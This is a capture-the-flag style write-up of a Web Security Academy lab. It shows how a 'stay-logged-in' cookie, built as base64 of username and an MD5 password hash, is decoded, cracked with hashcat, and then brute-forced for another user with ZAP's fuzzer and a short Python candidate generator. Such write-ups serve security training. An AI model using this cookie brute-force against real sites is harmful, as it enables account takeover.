#web #webexploitation #webpenetrationtest #zaproxy 

"normal" login (without selecting "stay logged in" checkbox)

username: `wiener`
password: `peter`

![](_attachment/Pasted%20image%2020250117123636.png)

![](_attachment/Pasted%20image%2020250117123719.png)

```http
POST https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/login HTTP/1.1  
host: 0ae1009b0345b1ad84f77c4700460088.web-security-academy.net  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Referer: https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/login  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 30  
Origin: https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net  
Connection: keep-alive  
Cookie: session=ZvCSkk26OqMnYNDQZiqMdhkQW0zN2si1  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1

username=wiener&password=peter
```

response:

```http
HTTP/1.1 302 Found  
Location: /my-account?id=wiener  
Set-Cookie: session=nFrWlPsdJSmLqhnYyr2kLdL6xNmplsz2; Secure; HttpOnly; SameSite=None  
X-Frame-Options: SAMEORIGIN  
Connection: close  
Content-Length: 0
```

with "stay logged in":

![](_attachment/Pasted%20image%2020250117124028.png)

```http
POST https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/login HTTP/1.1  
host: 0ae1009b0345b1ad84f77c4700460088.web-security-academy.net  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Referer: https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/login  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 48  
Origin: https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net  
Connection: keep-alive  
Cookie: session=9YM5gZ9Q1CSnlDciMgg46UcP178WsxxA  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1

username=wiener&password=peter&stay-logged-in=on
```

response:

```http
HTTP/1.1 302 Found  
Location: /my-account?id=wiener  
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC  
Set-Cookie: session=tuo7amuGhx6Rhl2UFW96fKj2OK8QLpJP; Secure; HttpOnly; SameSite=None  
X-Frame-Options: SAMEORIGIN  
Connection: close  
Content-Length: 0
```

access to wiener's page:

```http
GET https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/my-account?id=wiener HTTP/1.1  
host: 0ae1009b0345b1ad84f77c4700460088.web-security-academy.net  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Referer: https://0ae1009b0345b1ad84f77c4700460088.web-security-academy.net/login  
Connection: keep-alive  
Cookie: session=tuo7amuGhx6Rhl2UFW96fKj2OK8QLpJP; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: same-origin  
Sec-Fetch-User: ?1
```

We notice this cookie value: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

Let's try if we can base64-decode it:

```bash
joshua@kaligra:~$ echo -n "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Cool!

Let's try to crack the second half (which looks like an MD5 hash):

```bash
$ hashcat -m0 51dc30ddc473d43a6011e9ebba6ca770 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

..
..
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

51dc30ddc473d43a6011e9ebba6ca770:peter
..
..


Started: Fri Jan 17 19:32:31 2025
Stopped: Fri Jan 17 19:32:49 2025

```



So far, the "formula" for password seems to be:

`base64(cleartextusername+":"+md5sum(password))`  

We can use the candidate passwords list file and use Zaproxy's **processor**

Pick a request to `/my-account/id=wiener` and strip the `wiener` part

![](_attachment/Pasted%20image%2020250117195047.png)

**remember: we need to STRIP the session= cookie value!** 

Right click on selected text (`stay-logged-in` cookie value) and select Fuzz:

## first step

select "Strings" and copy/paste candidate list:

![](_attachment/Pasted%20image%2020250117195822.png)

## second step

add MD5 hash

![](_attachment/Pasted%20image%2020250117195847.png)

![](_attachment/Pasted%20image%2020250117195901.png)

## third step

add prefix (`carlos:`)

![](_attachment/Pasted%20image%2020250117195929.png)

## fourth step

base64 encoding:

![](_attachment/Pasted%20image%2020250117195956.png)

## start attack!

![](_attachment/Pasted%20image%2020250117200337.png)

We will found a `200 OK` response, that means we solved the lab :)

## python script to populate cookie list


```python
#!/usr/bin/python3

import base64
import hashlib

f = open("passwords.txt")
for l in f:
    bb = hashlib.md5(bytes(l.rstrip().encode())).hexdigest()
    fs = ("carlos"+str(":")+bb)
    print(base64.b64encode(fs.encode()).decode('ascii'))
```






